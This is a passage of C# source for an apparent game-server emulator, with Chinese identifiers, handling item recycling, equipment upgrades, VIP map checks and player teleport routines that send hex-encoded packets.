						if (value.钻石 != 0 && base.FLD_RXPIONTX != World.帐号总元宝上限)
						{
							num2 += value.钻石;
						}
					}
				}
			}
			if (num != 0)
			{
				检察元宝数据(num, 1, "物品回收");
				人物发光();
			}
			if (num2 != 0)
			{
				CheckGemPointsData(num2, 1, "物品回收");
				人物发光();
			}
			SaveGemData();
		}

		public void 附混石头()
		{
			int num = 0;
			int num2 = 0;
			int num3 = 0;
			int num4 = 0;
			int num5 = 0;
			for (int i = 0; i < 96; i++)
			{
				if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1000000161)
				{
					num = 1;
				}
				else if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1000000162)
				{
					num2 = 1;
				}
				else if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1000000163)
				{
					num3 = 1;
				}
				else if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1000000164)
				{
					num4 = 1;
				}
				else if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1000000199)
				{
					num5 = 1;
				}
			}
			if (num == 0 || num2 == 0 || num3 == 0 || num4 == 0 || num5 == 0)
			{
				系统提示("五种灵玉都凑齐才可以兑换附混石。");
				return;
			}
			for (int j = 0; j < 96; j++)
			{
				if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 1000000161)
				{
					减去物品(j, 1);
				}
				else if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 1000000162)
				{
					减去物品(j, 1);
				}
				else if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 1000000163)
				{
					减去物品(j, 1);
				}
				else if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 1000000164)
				{
					减去物品(j, 1);
				}
				else if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 1000000199)
				{
					减去物品(j, 1);
				}
			}
			int num6 = 得到包裹空位(this);
			if (num6 != -1)
			{
				增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000365), num6, BitConverter.GetBytes(1), new byte[56]);
			}
		}

		public void 装备2合1()
		{
			int num = 得到包裹空位(this);
			if (num == -1)
			{
				系统提示("背包空位不足，无法升级！", 10, "系统提示");
			}
			else if (BitConverter.ToInt32(装备栏包裹[0].物品ID, 0) != 0)
			{
				ItmeClass itmeClass = World.Itme[BitConverter.ToInt32(装备栏包裹[0].物品ID, 0)];
				string itmeDES = itmeClass.ItmeDES;
				if (itmeDES.Contains("110级") || itmeDES.Contains("120级") || itmeDES.Contains("130级") || itmeDES.Contains("140级") || itmeDES.Contains("150级") || itmeDES.Contains("160级") || itmeDES.Contains("170级") || (itmeDES.Contains("180级") && (itmeClass.FLD_RESIDE2 == 1 || itmeClass.FLD_RESIDE2 == 2 || itmeClass.FLD_RESIDE2 == 4 || itmeClass.FLD_RESIDE2 == 5 || itmeClass.FLD_RESIDE2 == 6)))
				{
					int num2 = ((itmeClass.FLD_LEVEL >= 130) ? ((itmeClass.FLD_RESIDE2 != 4 || itmeClass.FLD_LEVEL <= 130) ? 2 : 3) : ((itmeClass.FLD_RESIDE2 != 4) ? 1 : 10));
					int num3 = itmeClass.FLD_PID + num2;
					int 职业 = 0;
					if (itmeClass.FLD_LEVEL == 150)
					{
						if (itmeClass.FLD_RESIDE2 == 4)
						{
							职业 = itmeClass.FLD_RESIDE1;
						}
						num3 = 取套装物品ID2(职业, 179, itmeClass.FLD_RESIDE2, itmeClass.FLD_SEX, itmeClass.FLD_SEX);
					}
					if (itmeClass.FLD_LEVEL == 160)
					{
						if (itmeClass.FLD_RESIDE2 == 4)
						{
							职业 = itmeClass.FLD_RESIDE1;
						}
						num3 = 取套装物品ID2(职业, 189, itmeClass.FLD_RESIDE2, itmeClass.FLD_SEX, itmeClass.FLD_SEX);
					}
					if (itmeClass.FLD_LEVEL == 170)
					{
						num3 = 取套装物品ID2(职业, 199, itmeClass.FLD_RESIDE2, itmeClass.FLD_SEX, itmeClass.FLD_SEX);
					}
					if (itmeClass.FLD_LEVEL == 180)
					{
						num3 = 取套装物品ID2(职业, 209, itmeClass.FLD_RESIDE2, itmeClass.FLD_SEX, itmeClass.FLD_SEX);
					}
					if (BitConverter.ToInt32(装备栏包裹[0].物品ID, 0) != itmeClass.FLD_PID)
					{
						系统提示("需要2件一样的装备才可以升级, 放背包前2格。", 10, "系统提示");
						return;
					}
					if (BitConverter.ToInt32(装备栏包裹[1].物品ID, 0) != itmeClass.FLD_PID)
					{
						系统提示("需要2件一样的装备才可以升级, 放背包前2格。", 10, "系统提示");
						return;
					}
					if (itmeClass.FLD_LEVEL >= 150 && itmeClass.FLD_RESIDE2 == 4 && BitConverter.ToInt32(装备栏包裹[2].物品ID, 0) != 900000233 && BitConverter.ToInt32(装备栏包裹[2].物品数量, 0) < 10)
					{
						系统提示("武器升级需要10颗神器之石, 放背包第3格。", 10, "系统提示");
						return;
					}
					if (itmeClass.FLD_LEVEL >= 170 && BitConverter.ToInt32(装备栏包裹[2].物品ID, 0) != 900000233 && BitConverter.ToInt32(装备栏包裹[2].物品数量, 0) < 10)
					{
						系统提示("170以上防具升级需要10颗神器之石, 放背包第3格。", 10, "系统提示");
						return;
					}
					减去物品(0, 1);
					减去物品(1, 1);
					if (BitConverter.ToInt32(装备栏包裹[2].物品ID, 0) == 900000233)
					{
						减去物品(2, 10);
					}
					int num4 = 得到包裹空位(this);
					if (num4 != -1)
					{
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(num3), num4, BitConverter.GetBytes(1), new byte[56]);
						World.发送游戏特殊公告("恭喜玩家[" + base.UserName + "], 成功把[" + itmeClass.FLD_LEVEL + "级]装备进阶到[" + (itmeClass.FLD_LEVEL + 10) + "级].", 10, "装备进阶");
						RxjhClass.进化记录(base.Userid, base.UserName, itmeClass.FLD_PID, "!装备升级(2合1)", num3);
					}
				}
				else
				{
					系统提示("升级装备需要放到第一格子升级后为白装", 10, "系统提示");
				}
			}
			else
			{
				系统提示("升级装备需要放到第一格子升级后为白装", 10, "系统提示");
			}
		}

		public bool 移动地图VIP查询(int mapid)
		{
			if (base.FLD_VIP == 0)
			{
				string vIP地图 = World.VIP地图;
				char[] separator = new char[1] { ';' };
				string[] array = vIP地图.Split(separator);
				string[] array2 = array;
				string[] array3 = array2;
				foreach (string b in array3)
				{
					if (坐标Class.getmapname(mapid) == b)
					{
						系统提示("本地图名是会员地图，非会员不可以进入。");
						return false;
					}
				}
			}
			return true;
		}

		public void 移动切换画面()
		{
			byte[] array = Converter.hexStringToByte("AA551E001C019100180011000000110000007D00000000000000020000006500000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 天魔移动(float x, float y, float z, int map)
		{
			int num = 0;
			try
			{
				if (map == 41001 && (World.仙魔大战进程 >= 3 || World.仙魔大战进程 == 0))
				{
					return;
				}
				bool flag = false;
				if (map != base.人物坐标_地图)
				{
					移动切换画面();
				}
				if (base.人物坐标_地图 != map && !移动地图VIP查询(map))
				{
					return;
				}
				if (base.人物坐标_地图 == map && (double)base.人物坐标_X == (double)x && (double)base.人物坐标_Y == (double)y)
				{
					flag = true;
				}
				num = 1;
				移动离开当前地图(map);
				怪物攻击列表.Clear();
				num = 2;
				byte[] array = Converter.hexStringToByte("AA5522005C0079001C000000000000000000000070410000C64465000000000000000000000055AA");
				base.人物坐标_X = x;
				base.人物坐标_Y = y;
				base.人物坐标_Z = z;
				base.人物坐标_地图 = map;
				移动中目标坐标X = x;
				移动中目标坐标Y = y;
				移动时间 = DateTime.Now;
				num = 3;
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_X), 0, array, 14, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Y), 0, array, 22, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Z), 0, array, 18, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_地图), 0, array, 26, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				num = 4;
				获取复查范围玩家();
				num = 5;
				获取复查范围Npc();
				num = 6;
				获取复查范围地面物品();
				num = 7;
				服务器时间();
				打开仓库中 = false;
				if (map != 42001 && World.申请攻城人物列表.Contains(this))
				{
					World.申请攻城人物列表.Remove(this);
				}
				上次坐标X = x;
				上次坐标Y = y;
				num = 8;
				if (map == 9001 || map == 9101 || map == 9201)
				{
					if (GetAddState(601101))
					{
						追加状态列表[601101].时间结束事件();
					}
					if (GetAddState(601102))
					{
						追加状态列表[601102].时间结束事件();
					}
					if (GetAddState(601103))
					{
						追加状态列表[601103].时间结束事件();
					}
					if (GetAddState(1001101))
					{
						追加状态列表[1001101].时间结束事件();
					}
					if (GetAddState(1001102))
					{
						追加状态列表[1001102].时间结束事件();
					}
					if (GetAddState(1001201))
					{
						追加状态列表[1001201].时间结束事件();
					}
					if (GetAddState(1001202))
					{
						追加状态列表[1001202].时间结束事件();
					}
					更新人物数据(this);
					更新装备效果to(this, this);
				}
				else
				{
					switch (行走状态id)
					{
					case 2:
						if (GetAddState(601101))
						{
							追加状态列表[601101].时间结束事件();
							追加状态列表.Add(601101, new 追加状态类(this, 300000, 601101, 0));
							行走状态id = 2;
							状态效果(BitConverter.GetBytes(601101), 1, 300000);
							行走状态(BitConverter.GetBytes(601101), 2);
							num = 9;
							更新移动速度();
						}
						break;
					case 3:
						if (GetAddState(601102))
						{
							追加状态列表[601102].时间结束事件();
							追加状态列表.Add(601102, new 追加状态类(this, 300000, 601102, 0));
							行走状态id = 3;
							状态效果(BitConverter.GetBytes(601102), 1, 300000);
							行走状态(BitConverter.GetBytes(601102), 3);
							num = 10;
							更新移动速度();
						}
						break;
					case 5:
						if (GetAddState(601103))
						{
							追加状态列表[601103].时间结束事件();
							追加状态列表.Add(601103, new 追加状态类(this, 300000, 601103, 0));
							行走状态id = 5;
							状态效果(BitConverter.GetBytes(601103), 1, 300000);
							行走状态(BitConverter.GetBytes(601103), 5);
							num = 11;
							更新移动速度();
						}
						break;
					case 6:
						if (GetAddState(1001101))
						{
							if (潜行模式 == 1)
							{
								潜行状态(0);
							}
							追加状态列表[1001101].时间结束事件();
							追加状态列表.Add(1001101, new 追加状态类(this, 300000, 1001101, 0));
							行走状态id = 6;
							状态效果(BitConverter.GetBytes(1001101), 1, 300000);
							行走状态(BitConverter.GetBytes(1001101), 6);
							更新移动速度();
						}
						break;
					case 7:
						if (GetAddState(1001102))
						{
							if (潜行模式 == 1)
							{
								潜行状态(0);
							}
							追加状态列表[1001102].时间结束事件();
							追加状态列表.Add(1001102, new 追加状态类(this, 300000, 1001102, 0));
							行走状态id = 7;
							状态效果(BitConverter.GetBytes(1001102), 1, 300000);
							行走状态(BitConverter.GetBytes(1001102), 7);
							更新移动速度();
						}
						break;
					case 8:
						if (GetAddState(1001201))
						{
							if (潜行模式 == 1)
							{
								潜行状态(0);
							}
							追加状态列表[1001201].时间结束事件();
							追加状态列表.Add(1001201, new 追加状态类(this, 300000, 1001201, 0));
							行走状态id = 8;
							状态效果(BitConverter.GetBytes(1001201), 1, 300000);
							行走状态(BitConverter.GetBytes(1001201), 8);
							更新移动速度();
						}
						break;
					case 9:
						if (GetAddState(1001202))
						{
							if (潜行模式 == 1)
							{
								潜行状态(0);
							}
							追加状态列表[1001202].时间结束事件();
							追加状态列表.Add(1001202, new 追加状态类(this, 300000, 1001202, 0));
							行走状态id = 9;
							状态效果(BitConverter.GetBytes(1001202), 1, 300000);
							行走状态(BitConverter.GetBytes(1001202), 9);
							更新移动速度();
						}
						break;
					}
				}
				if (!flag)
				{
					if (移动地图计时器 != null)
					{
						移动地图计时器.Enabled = false;
						移动地图计时器.Close();
						移动地图计时器.Dispose();
						移动地图计时器 = null;
					}
					触发地图移动事件 = true;
					移动地图计时器 = new System.Timers.Timer(90000.0);
					移动地图计时器.Elapsed += 移动结束事件;
					移动地图计时器.Enabled = true;
					移动地图计时器.AutoReset = false;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "移动 出错 [" + base.Userid + "][" + base.UserName + "][" + num + "][" + x + "][" + y + "][" + z + "][" + map + "]" + ex.Message);
			}
		}

		public void 死亡移动(float x, float y, float z, int map)
		{
			int num = 0;
			try
			{
				bool flag = false;
				if (base.人物坐标_地图 != map && !移动地图VIP查询(map))
				{
					return;
				}
				if (base.人物坐标_地图 == map && (double)base.人物坐标_X == (double)x && (double)base.人物坐标_Y == (double)y)
				{
					flag = true;
				}
				if (自动坐标 != null)
				{
					自动坐标.Enabled = false;
					自动坐标.Close();
					自动坐标.Dispose();
					自动坐标 = null;
				}
				if (自动攻击 != null)
				{
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				num = 1;
				移动离开当前地图(map);
				怪物攻击列表.Clear();
				num = 2;
				byte[] array = Converter.hexStringToByte("AA5522005C0079001C000000000000000000000070410000C64465000000000000000000000055AA");
				base.人物坐标_X = x;
				base.人物坐标_Y = y;
				base.人物坐标_Z = z;
				base.人物坐标_地图 = map;
				移动中目标坐标X = x;
				移动中目标坐标Y = y;
				移动时间 = DateTime.Now;
				num = 3;
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_X), 0, array, 14, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Y), 0, array, 22, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Z), 0, array, 18, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_地图), 0, array, 26, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 34, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				num = 4;
				获取复查范围玩家();
				num = 5;
				获取复查范围Npc();
				num = 6;
				获取复查范围地面物品();
				num = 7;
				服务器时间();
				打开仓库中 = false;
				if (map != 42001 && World.申请攻城人物列表.Contains(this))
				{
					World.申请攻城人物列表.Remove(this);
				}
				上次坐标X = x;
				上次坐标Y = y;
				num = 8;
				if (map == 9001 || map == 9101 || map == 9201)
				{
					if (GetAddState(601101))
					{
						追加状态列表[601101].时间结束事件();
					}
					if (GetAddState(601102))
					{
						追加状态列表[601102].时间结束事件();
					}
					if (GetAddState(601103))
					{
						追加状态列表[601103].时间结束事件();
					}
					if (GetAddState(1001101))
					{
						追加状态列表[1001101].时间结束事件();
					}
					if (GetAddState(1001102))
					{
						追加状态列表[1001102].时间结束事件();
					}
					if (GetAddState(1001201))
					{
						追加状态列表[1001201].时间结束事件();
					}
					if (GetAddState(1001202))
					{
						追加状态列表[1001202].时间结束事件();
					}
					更新人物数据(this);
					更新装备效果to(this, this);
				}
				else
				{
					switch (行走状态id)
					{
					case 2:
						if (GetAddState(601101))
						{
							追加状态列表[601101].时间结束事件();
							追加状态列表.Add(601101, new 追加状态类(this, 300000, 601101, 0));
							行走状态id = 2;
							状态效果(BitConverter.GetBytes(601101), 1, 300000);
							行走状态(BitConverter.GetBytes(601101), 2);
							num = 9;
							更新移动速度();
						}
						break;
					case 3:
						if (GetAddState(601102))
						{
							追加状态列表[601102].时间结束事件();
							追加状态列表.Add(601102, new 追加状态类(this, 300000, 601102, 0));
							行走状态id = 3;
							状态效果(BitConverter.GetBytes(601102), 1, 300000);
							行走状态(BitConverter.GetBytes(601102), 3);
							num = 10;
							更新移动速度();
						}
						break;
					case 5:
						if (GetAddState(601103))
						{
							追加状态列表[601103].时间结束事件();
							追加状态列表.Add(601103, new 追加状态类(this, 300000, 601103, 0));
							行走状态id = 5;
							状态效果(BitConverter.GetBytes(601103), 1, 300000);
							行走状态(BitConverter.GetBytes(601103), 5);
							num = 11;
							更新移动速度();
						}
						break;
					case 6:
						if (GetAddState(1001101))
						{
							if (潜行模式 == 1)
							{
								潜行状态(0);
							}
							追加状态列表[1001101].时间结束事件();
							追加状态列表.Add(1001101, new 追加状态类(this, 300000, 1001101, 0));
							行走状态id = 6;
							状态效果(BitConverter.GetBytes(1001101), 1, 300000);
							行走状态(BitConverter.GetBytes(1001101), 6);
							更新移动速度();
						}
						break;
					case 7:
						if (GetAddState(1001102))
						{
							if (潜行模式 == 1)
							{
								潜行状态(0);
							}
							追加状态列表[1001102].时间结束事件();
							追加状态列表.Add(1001102, new 追加状态类(this, 300000, 1001102, 0));
							行走状态id = 7;
							状态效果(BitConverter.GetBytes(1001102), 1, 300000);
							行走状态(BitConverter.GetBytes(1001102), 7);
							更新移动速度();
						}
						break;
					case 8:
						if (GetAddState(1001201))
						{
							if (潜行模式 == 1)
							{
								潜行状态(0);
							}
							追加状态列表[1001201].时间结束事件();
							追加状态列表.Add(1001201, new 追加状态类(this, 300000, 1001201, 0));
							行走状态id = 8;
							状态效果(BitConverter.GetBytes(1001201), 1, 300000);
							行走状态(BitConverter.GetBytes(1001201), 8);
							更新移动速度();
						}
						break;
					case 9:
						if (GetAddState(1001202))
						{
							if (潜行模式 == 1)
							{
								潜行状态(0);
							}
							追加状态列表[1001202].时间结束事件();
							追加状态列表.Add(1001202, new 追加状态类(this, 300000, 1001202, 0));
							行走状态id = 9;
							状态效果(BitConverter.GetBytes(1001202), 1, 300000);
							行走状态(BitConverter.GetBytes(1001202), 9);
							更新移动速度();
						}
						break;
					}
				}
				if (!flag)
				{
					if (移动地图计时器 != null)
					{
						移动地图计时器.Enabled = false;
						移动地图计时器.Close();
						移动地图计时器.Dispose();
						移动地图计时器 = null;
					}
					触发地图移动事件 = true;
					移动地图计时器 = new System.Timers.Timer(90000.0);
					移动地图计时器.Elapsed += 移动结束事件;
					移动地图计时器.Enabled = true;
					移动地图计时器.AutoReset = false;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "天魔移动 出错 [" + base.Userid + "][" + base.UserName + "][" + num + "][" + x + "][" + y + "][" + z + "][" + map + "]" + ex.Message);
			}
		}

		public void 关百宝()
		{
			string hex = "AA5507007100D50001000255AA";
			byte[] array = Converter.hexStringToByte(hex);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 移动(float x, float y, float z, int map)
		{
			string[] array = World.监狱地图.Trim().Split(',');
			if (base.人物坐标_地图 == int.Parse(array[0]) && base.人物善恶 < 0)
			{
				系统提示("你想逃狱么~这里苍蝇都飞不出去, 安心的泡点吧", 10, "系统提示");
				return;
			}
			if (map != base.人物坐标_地图)
			{
				移动切换画面();
				关百宝();
			}
			int num = 0;
			try
			{
				if ((map == 41001 && (World.仙魔大战进程 >= 3 || World.仙魔大战进程 == 0)) || (map == 801 && (World.势力战进程 >= 3 || World.势力战进程 == 0)))
				{
					return;
				}
				bool flag = false;
				if (base.人物坐标_地图 != map && !移动地图VIP查询(map))
				{
					return;
				}
				if (base.人物坐标_地图 == map && (double)base.人物坐标_X == (double)x && (double)base.人物坐标_Y == (double)y)
				{
					flag = true;
				}
				num = 1;
				if (base.人物坐标_地图 == 41001)
				{
					发送仙魔大战关闭消息();
				}
				if (base.人物坐标_地图 == 801)
				{
					势力战系统.发送势力战系统封包(this, 14, 2, 0);
					势力战系统.发送势力战关闭消息旧(this);
				}
				移动离开当前地图(map);
				怪物攻击列表.Clear();
				num = 2;
				byte[] array2 = Converter.hexStringToByte("AA5522005C0079001C00000000000060D1C5000070410000D0412D010000000000000000000055AA");
				base.人物坐标_X = x;
				base.人物坐标_Y = y;
				base.人物坐标_Z = z;
				base.人物坐标_地图 = map;
				移动中目标坐标X = x;
				移动中目标坐标Y = y;
				移动时间 = DateTime.Now;
				num = 3;
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_X), 0, array2, 14, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Y), 0, array2, 22, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Z), 0, array2, 18, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_地图), 0, array2, 26, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array2, array2.Length);
				}
				num = 4;
				获取复查范围玩家();
				num = 5;
				获取复查范围Npc();
				num = 6;
				获取复查范围地面物品();
				num = 7;
				服务器时间();
				更新广播人物数据();
				打开仓库中 = false;
				if (map != 42001 && World.申请攻城人物列表.Contains(this))
				{
					World.申请攻城人物列表.Remove(this);
				}
				if (map == 801)
				{
					if (World.势力战进程 == 3)
					{
						势力战系统.发送势力战消息2(this);
						势力战系统.发送势力战人数及分数(this);
					}
					if (World.势力战进程 == 1)
					{
						更新人物数据(this);
						更新装备效果();
					}
				}
				if (map == 41001)
				{
					if (World.仙魔大战进程 == 3)
					{
						发送仙魔大战消息2();
					}
					if (World.仙魔大战进程 == 1)
					{
						更新人物数据(this);
						更新装备效果();
					}
				}
				上次坐标X = x;
				上次坐标Y = y;
				num = 8;
				if (map == 9001 || map == 9101 || map == 9201)
				{
					if (GetAddState(601101))
					{
						追加状态列表[601101].时间结束事件();
					}
					if (GetAddState(601102))
					{
						追加状态列表[601102].时间结束事件();
					}
					if (GetAddState(601103))
					{
						追加状态列表[601103].时间结束事件();
					}
					if (GetAddState(1001101))
					{
						追加状态列表[1001101].时间结束事件();
					}
					if (GetAddState(1001102))
					{
						追加状态列表[1001102].时间结束事件();
					}
					if (GetAddState(1001201))
					{
						追加状态列表[1001201].时间结束事件();
					}
					if (GetAddState(1001202))
					{
						追加状态列表[1001202].时间结束事件();
					}
					更新人物数据(this);
					更新装备效果to(this, this);
				}
				else
				{
					switch (行走状态id)
					{
					case 2:
						if (GetAddState(601101))
						{
							追加状态列表[601101].时间结束事件();
							追加状态列表.Add(601101, new 追加状态类(this, 300000, 601101, 0));
							行走状态id = 2;
							状态效果(BitConverter.GetBytes(601101), 1, 300000);
							行走状态(BitConverter.GetBytes(601101), 2);
							num = 9;
							更新移动速度();
						}
						break;
					case 3:
						if (GetAddState(601102))
						{
							追加状态列表[601102].时间结束事件();
							追加状态列表.Add(601102, new 追加状态类(this, 300000, 601102, 0));
							行走状态id = 3;
							状态效果(BitConverter.GetBytes(601102), 1, 300000);
							行走状态(BitConverter.GetBytes(601102), 3);
							num = 10;
							更新移动速度();
						}
						break;
					case 5:
						if (GetAddState(601103))
						{
							追加状态列表[601103].时间结束事件();
							追加状态列表.Add(601103, new 追加状态类(this, 300000, 601103, 0));
							行走状态id = 5;
							状态效果(BitConverter.GetBytes(601103), 1, 300000);
							行走状态(BitConverter.GetBytes(601103), 5);
							num = 11;
							更新移动速度();
						}
						break;
					case 6:
						if (GetAddState(1001101))
						{
							if (潜行模式 == 1)
							{
								潜行状态(0);
							}
							追加状态列表[1001101].时间结束事件();
							追加状态列表.Add(1001101, new 追加状态类(this, 300000, 1001101, 0));
							行走状态id = 6;
							状态效果(BitConverter.GetBytes(1001101), 1, 300000);
							行走状态(BitConverter.GetBytes(1001101), 6);
							更新移动速度();
						}
						break;
					case 7:
						if (GetAddState(1001102))
						{
							if (潜行模式 == 1)
							{
								潜行状态(0);
							}
							追加状态列表[1001102].时间结束事件();
							追加状态列表.Add(1001102, new 追加状态类(this, 300000, 1001102, 0));
							行走状态id = 7;
							状态效果(BitConverter.GetBytes(1001102), 1, 300000);
							行走状态(BitConverter.GetBytes(1001102), 7);
							更新移动速度();
						}
						break;
					case 8:
						if (GetAddState(1001201))
						{
							if (潜行模式 == 1)
							{
								潜行状态(0);
							}
							追加状态列表[1001201].时间结束事件();
							追加状态列表.Add(1001201, new 追加状态类(this, 300000, 1001201, 0));
							行走状态id = 8;
							状态效果(BitConverter.GetBytes(1001201), 1, 300000);
							行走状态(BitConverter.GetBytes(1001201), 8);
							更新移动速度();
						}
						break;
					case 9:
						if (GetAddState(1001202))
						{
							if (潜行模式 == 1)
							{
								潜行状态(0);
							}
							追加状态列表[1001202].时间结束事件();
							追加状态列表.Add(1001202, new 追加状态类(this, 300000, 1001202, 0));
							行走状态id = 9;
							状态效果(BitConverter.GetBytes(1001202), 1, 300000);
							行走状态(BitConverter.GetBytes(1001202), 9);
							更新移动速度();
						}
						break;
					}
				}
				if (!flag)
				{
					if (移动地图计时器 != null)
					{
						移动地图计时器.Enabled = false;
						移动地图计时器.Close();
						移动地图计时器.Dispose();
						移动地图计时器 = null;
					}
					触发地图移动事件 = true;
					移动地图计时器 = new System.Timers.Timer(90000.0);
					移动地图计时器.Elapsed += 移动结束事件;
					移动地图计时器.Enabled = true;
					移动地图计时器.AutoReset = false;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "移动 出错 [" + base.Userid + "][" + base.UserName + "][" + num + "][" + x + "][" + y + "][" + z + "][" + map + "]" + ex.Message);
			}
		}

		public bool 移动1(float x, float y, float z, int map)
		{
			try
			{
				if (组队阶段 == 1)
				{
					return false;
				}
				bool flag = false;
				if (base.人物坐标_地图 == map && (double)base.人物坐标_X == (double)x && (double)base.人物坐标_Y == (double)y)
				{
					flag = true;
				}
				if ((map == 1601 || map == 1901 || map == 2001 || map == 2101 || map == 2201 || map == 5001) && base.Player_Job_leve < 2)
				{
					系统提示("高级地图只允许2转以上的玩家进入。", 50, "系统提示");
					return false;
				}
				if (自动攻击 != null)
				{
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				if (自动恢复 != null)
				{
					自动恢复.Enabled = false;
					自动恢复.Close();
					自动恢复.Dispose();
					自动恢复 = null;
				}
				if (自动复活 != null)
				{
					自动复活.Enabled = false;
					自动复活.Close();
					自动复活.Dispose();
					自动复活 = null;
				}
				int num = base.人物坐标_地图;
				if (base.人物坐标_地图 == 801)
				{
				}
				移动离开当前地图(map);
				byte[] array = Converter.hexStringToByte("AA5522005C0079001C00000000000060D1C5000070410000D0412D010000000000000000000055AA");
				base.人物坐标_X = x;
				base.人物坐标_Y = y;
				base.人物坐标_Z = z;
				目标坐标X = x;
				目标坐标Y = y;
				base.人物坐标_地图 = map;
				if (人物灵兽 != null)
				{
					人物灵兽.人物坐标_X = x;
					人物灵兽.人物坐标_Z = z;
					人物灵兽.人物坐标_Y = y;
					人物灵兽.人物坐标_MAP = map;
				}
				发包类 发包类 = new 发包类();
				发包类.Write(base.人物坐标_X);
				发包类.Write(base.人物坐标_Z);
				发包类.Write(base.人物坐标_Y);
				发包类.Write4(base.人物坐标_地图);
				发包类.Write4(0);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 30976, base.人物全服ID);
				}
				获取复查范围玩家();
				获取复查范围Npc();
				获取复查范围地面物品();
				服务器时间();
				打开仓库中 = false;
				if (map == 801 && World.势力战进程 == 3)
				{
				}
				if (追加状态列表.ContainsKey(1000000616))
				{
					更新装备效果();
					更新人物数据(this);
					更新广播人物数据();
				}
				switch (行走状态id)
				{
				case 2:
					if (PrivateState(601101))
					{
						追加状态列表[601101].时间结束事件();
					}
					追加状态列表.Add(601101, new 追加状态类(this, 300000, 601101, 0));
					行走状态id = 2;
					状态效果(BitConverter.GetBytes(601101), 1, 300000);
					行走状态(BitConverter.GetBytes(601101), 2);
					更新移动速度();
					break;
				case 3:
					if (PrivateState(601102))
					{
						追加状态列表[601102].时间结束事件();
					}
					追加状态列表.Add(601102, new 追加状态类(this, 300000, 601102, 0));
					行走状态id = 3;
					状态效果(BitConverter.GetBytes(601102), 1, 300000);
					行走状态(BitConverter.GetBytes(601102), 3);
					更新移动速度();
					break;
				case 5:
					if (PrivateState(601103))
					{
						追加状态列表[601103].时间结束事件();
					}
					追加状态列表.Add(601103, new 追加状态类(this, 300000, 601103, 0));
					行走状态id = 5;
					状态效果(BitConverter.GetBytes(601103), 1, 300000);
					行走状态(BitConverter.GetBytes(601103), 5);
					更新移动速度();
					break;
				}
				更新广播人物数据();
				if (flag)
				{
					return true;
				}
			}
			catch (Exception ex)
			{
				if (离线自动打怪 == 0)
				{
					MainForm.WriteLine(1, "移动   出错   [" + base.Userid + "][" + base.UserName + "]   " + ex.Message);
				}
				else if (假人移动出错纠正 >= 5)
				{
					MainForm.WriteLine(1, "假人移动   出错   [" + base.Userid + "][" + base.UserName + "]   " + ex.Message);
					离线自动打怪 = 0;
					假人移动出错纠正 = 0;
					World.OfflineCount--;
					if (World.OfflineCount < 0)
					{
						World.OfflineCount = 0;
					}
					RxjhClass.设置账号在线状态(base.Userid, 0);
					base.Client.DisposedOffline();
				}
				else
				{
					假人移动出错纠正++;
					MainForm.WriteLine(2, "假人移动纠正 [" + base.Userid + "][" + base.UserName + "]");
					base.每日势力ZX = 0;
					假人是否参与势力战 = 0;
					假人是否参与世界排行boss = 0;
					移动(-1131f, 1209f, 15f, 101);
				}
			}
			return true;
		}

		public void 移动结束事件(object source, ElapsedEventArgs e)
		{
			try
			{
				触发地图移动事件 = false;
				if (移动地图计时器 != null)
				{
					移动地图计时器.Enabled = false;
					移动地图计时器.Close();
					移动地图计时器.Dispose();
					移动地图计时器 = null;
				}
			}
			catch
			{
			}
		}

		public void Npc传送(byte[] 封包数据, int length)
		{
			封包修改(封包数据, length);
			Buffer.BlockCopy(BitConverter.GetBytes(0), 0, 封包数据, 3, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, 封包数据, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(封包数据, 封包数据.Length);
			}
			byte[] array = new byte[2];
			Buffer.BlockCopy(封包数据, 10, array, 0, 2);
			if (BitConverter.ToInt16(array, 0) != 3)
			{
				return;
			}
